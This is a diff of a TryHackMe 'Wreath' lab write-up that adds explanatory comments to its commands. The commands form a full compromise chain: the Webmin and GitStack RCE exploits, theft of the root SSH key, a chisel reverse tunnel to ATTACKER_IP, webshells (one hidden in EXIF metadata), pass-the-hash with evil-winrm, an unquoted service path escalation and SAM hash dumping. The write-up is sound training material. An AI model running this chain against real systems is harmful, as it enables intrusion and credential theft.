@@ -1,4 +1,4 @@
-﻿# TryHackMe - Wreath
+# TryHackMe - Wreath
 
 ## Target Metadata
 
@@ -69,8 +69,12 @@ Reusable commands were extracted into [nmap](../../../tools/recon/nmap.md), [pro
 
 ```bash
 ping $TARGET -c1
+# What it does: runs an Nmap scan with the specified ports/scripts/options.
+# Why here: identify exposed services and decide on the next enumeration.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent-web-server
 nmap -sVC -p22,80,443,10000 $TARGET -oN service-web-server
+# What it does: adds machine domains to /etc/hosts.
+# Why here: resolve virtual hosts during web enumeration.
 echo "$TARGET thomaswreath.thm" | sudo tee -a /etc/hosts
 ```
 
@@ -83,9 +87,17 @@ Full technique: [Webmin 1.890 RCE](../../../exploits/web-rce/webmin-cve-2019-151
 The Webmin service was vulnerable to unauthenticated RCE. The exploit returned a root shell, then the root SSH key was recovered for a stable foothold.
 
 ```bash
+# What it does: executes or compiles the script/program with the specified arguments.
+# Why here: launch the necessary exploit or helper in this phase.
 python3 CVE-2019-15107.py $TARGET
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /root/.ssh/id_rsa
+# What it does: changes permissions or owner.
+# Why here: make a payload executable or control access to a file.
 chmod 600 id_rsa
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh -i id_rsa root@$TARGET
 ```
 
@@ -103,6 +115,8 @@ The first pivot exposed the internal network through a reverse SOCKS tunnel:
 ./chisel client ATTACKER_IP:15000 R:socks &
 
 # Kali through proxychains
+# What it does: configures or uses a pivoting/remote access tool.
+# Why here: reach internal services through the compromised path.
 proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
 ```
 
@@ -123,9 +137,13 @@ Full technique: [GitStack 2.3.10 RCE](../../../exploits/web-rce/gitstack-rce.md)
 GitStack was reachable on port `80` through the SOCKS pivot and was vulnerable to a public unauthenticated RCE. The exploit uploaded a PHP webshell and command execution was triggered with `curl`.
 
 ```bash
+# What it does: searches for or copies a local Exploit-DB PoC.
+# Why here: relate the detected version to a reusable exploit.
 searchsploit gitstack
 searchsploit -m 43777
 dos2unix 43777.py
+# What it does: configures or uses a pivoting/remote access tool.
+# Why here: reach internal services through the compromised path.
 proxychains /usr/bin/python2 43777.py
 proxychains curl -X POST http://10.200.180.150/web/exploit-tryzub.php --data-urlencode "a=whoami"
 ```
@@ -140,6 +158,8 @@ firewall-cmd --zone=public --add-port=4444/tcp
 
 # Kali
 ./chisel client 10.200.180.200:16000 R:4444:127.0.0.1:4444 &
+# What it does: opens or uses a TCP connection/listener.
+# Why here: receive shell, transfer data or check connectivity.
 rlwrap nc -lvnp 4444
 ```
 
@@ -157,7 +177,11 @@ net user tryzub
 ```
 
 ```bash
+# What it does: opens a WinRM shell with the specified credentials/hash.
+# Why here: obtain interactive Windows access after validating credentials.
 proxychains evil-winrm -u tryzub -p 'Tryzub@' -i 10.200.180.150
+# What it does: configures or uses a pivoting/remote access tool.
+# Why here: reach internal services through the compromised path.
 proxychains xfreerdp /v:10.200.180.150 /u:tryzub /p:'Tryzub@' +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share /cert:ignore /sec:tls
 ```
 
@@ -172,6 +196,8 @@ lsadump::sam
 ```
 
 ```bash
+# What it does: opens a WinRM shell with the specified credentials/hash.
+# Why here: obtain interactive Windows access after validating credentials.
 proxychains evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
 ```
 
@@ -213,17 +239,27 @@ download website.zip
 ```
 
 ```bash
+# What it does: extracts a compressed file to the chosen directory.
+# Why here: inspect source code or recovered files.
 unzip website.zip -d ./repos
+# What it does: copies or moves a file.
+# Why here: prepare payloads or place loot where the next command expects it.
 mv Website.git .git
 git clone https://github.com/internetwache/GitTools
 /home/kali/Desktop/tools/GitTools/Extractor/extractor.sh . Website_extracted
+# What it does: searches the filesystem with the specified filters.
+# Why here: locate credentials, binaries, configs or writable paths.
 find . -name "*.php"
 ```
 
 The working payload used a PHP webshell embedded in EXIF `Comment` metadata:
 
 ```bash
+# What it does: copies or moves a file.
+# Why here: prepare payloads or place loot where the next command expects it.
 mv image.jpg image.jpeg.php
+# What it does: inspects or extracts hidden content/metadata from a file.
+# Why here: recover clues or credentials hidden in assets.
 exiftool -Comment="$(cat /tmp/payload.php)" image.jpeg.php
 ```
 
@@ -238,10 +274,14 @@ Full techniques: [Windows unquoted service path](../../../exploits/privesc-windo
 Manual service enumeration found `SystemExplorerHelpService` with a space-containing unquoted path under a directory writable by `BUILTIN\Users`.
 
 ```cmd
+REM What it does: execute a Windows command-line action.
+REM Why here: enumerate, transfer, replace or validate artifacts on the victim.
 whoami /priv
 whoami /groups
 wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
 sc qc SystemExplorerHelpService
+REM What it does: execute a PowerShell command on Windows.
+REM Why here: download, execute or enumerate from the Windows foothold.
 powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
 ```
 
@@ -252,6 +292,8 @@ mcs Wrapper.cs
 ```
 
 ```cmd
+REM What it does: execute a Windows command-line action.
+REM Why here: enumerate, transfer, replace or validate artifacts on the victim.
 sc stop SystemExplorerHelpService
 sc start SystemExplorerHelpService
 ```
@@ -264,6 +306,8 @@ reg.exe save HKLM\SYSTEM system.bak
 ```
 
 ```bash
+# What it does: executes an Impacket utility for AD/Windows.
+# Why here: extract tickets, hashes or protocol access for the chain.
 impacket-secretsdump -sam sam.bak -system system.bak LOCAL
 ```
 
@@ -310,3 +354,5 @@ impacket-secretsdump -sam sam.bak -system system.bak LOCAL
 - [Windows unquoted service path](../../../exploits/privesc-windows/windows-unquoted-service-path.md)
 - [Windows SAM hive dump](../../../exploits/creds/windows-sam-hive-dump.md)
 - [Windows enumeration](../../../exploits/enumeration/windows-enumeration.md)
+
+
